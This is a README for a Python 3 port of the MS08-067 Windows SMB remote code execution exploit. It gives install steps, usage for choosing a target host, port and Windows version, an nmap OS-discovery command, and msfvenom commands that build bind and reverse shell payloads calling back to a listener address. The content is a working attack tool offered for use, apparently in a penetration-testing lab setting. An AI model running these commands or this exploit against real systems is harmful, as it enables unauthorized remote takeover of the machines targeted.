# MS08_067 Exploit Python

This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/). The
return addresses and the ROP parts are ported from metasploit module
exploit/windows/smb/ms08_067_netapi

Mod in 2018 by Andy Acer:

- Added support for selecting a target port at the command line. It seemed that only 445 was
  previously supported.
- Changed library calls to correctly establish a NetBIOS session for SMB transport
- Changed shellcode handling to allow for variable length shellcode. Just cut and paste into this
  source file.

Mod in 2020 by Dev:

- Rewrite for Python3
- Better arg parsing

## Prerequisites

- [pyenv](https://github.com/pyenv/pyenv) (suggested)
- [pyenv-virtualenv](https://github.com/pyenv/pyenv-virtualenv) (suggested)

(suggested) Set up the virtual environment with pyenv

```bash
pyenv install 3.8.2
pyenv virtualenv 3.8.2 derwentx_ms08_67
```

## Installation

```bash
git clone https://github.com/derwentx/ms08_067.git derwentx_ms08_067
cd derwentx_ms08_067
pyenv local derwentx_ms08_67 # if using pyenv
python -m pip install -r requirements.txt
```

## Usage

```txt
ms08_067_2018.py [-h] [--port PORT] [HOST] [OS_TYPE] [PAYLOAD_FILE]

positional arguments:
  HOST          the target SMB host
  OS_TYPE       os type (see help)
  PAYLOAD_FILE  optional file to read payload from if not stdin

optional arguments:
  -h, --help    show this help message and exit
  --port PORT   the SMB port to target

OS Types:

    1 -> Windows XP SP0/SP1 Universal
    2 -> Windows 2000 Universal
    3 -> Windows 2003 SP0 Universal
    4 -> Windows 2003 SP1 English
    5 -> Windows XP SP3 French (NX)
    6 -> Windows XP SP3 English (NX)
    7 -> Windows XP SP3 English (AlwaysOn NX)

NMAP Tips:

    nmap has a good OS discovery script that pairs well with this exploit:
    $ nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery

Generating Shellcode:

    $ msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode
    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode
    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b
      "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f raw -a x86 --platform windows > shellcode
```
